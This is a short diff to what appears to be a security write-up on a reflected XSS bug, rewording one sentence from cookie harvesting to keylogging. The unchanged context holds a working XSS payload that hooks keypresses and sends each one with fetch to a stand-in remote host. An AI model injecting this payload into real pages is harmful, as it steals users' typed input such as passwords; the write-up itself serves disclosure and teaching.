@@ -88,7 +88,7 @@ This XSS bug not only modifies the DOM but is reflected in the URL. This means w
 
 ![cookies](/assets/img/posts/cookie_redac.png)
 
-Harvesting cookies and shipping them off to a remote server is also quite simple:
+Keylogging and shipping the data off to a remote server is also quite simple:
 ```
 </h3><img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'><h3>
 ```
